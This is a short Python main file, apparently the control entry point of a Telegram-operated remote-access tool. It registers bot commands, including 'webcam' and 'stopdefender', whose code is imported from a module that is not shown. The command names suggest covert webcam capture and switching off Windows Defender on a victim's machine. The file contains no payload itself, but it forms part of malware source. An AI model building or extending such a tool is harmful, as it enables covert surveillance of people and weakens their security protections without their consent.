# In deze file wordt de bot opgestart en luister hij  naar commands
import os
from dotenv import load_dotenv
from typing import Final
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from commands import *


load_dotenv()
API_TOKEN: Final = os.getenv("TELEGRAM_BOT_TOKEN")
# BOT_HANDLE: Final = '@Daughter1738Bot'


# https://levelup.gitconnected.com/building-a-telegram-bot-in-2024-with-python-17b483a7f6b9#:~:text=Let%E2%80%99s%20now%20continue!-,3.%20main.py,-Create%20a%20new
if __name__ == '__main__':
    app = Application.builder().token(API_TOKEN).build()

    # Register command handlers
    app.add_handler(CommandHandler('banner', banner_command))
    app.add_handler(CommandHandler('help', help_command))
    app.add_handler(CommandHandler('webcam', cam_command))
    app.add_handler(CommandHandler('stopdefender', custom_command))

    # Register message handler
    app.add_handler(MessageHandler(filters.TEXT, no_command))

    # Register error handler 
    app.add_error_handler(log_error)

    print('Bot is ready')
    # Run the bot
    app.run_polling(poll_interval=2)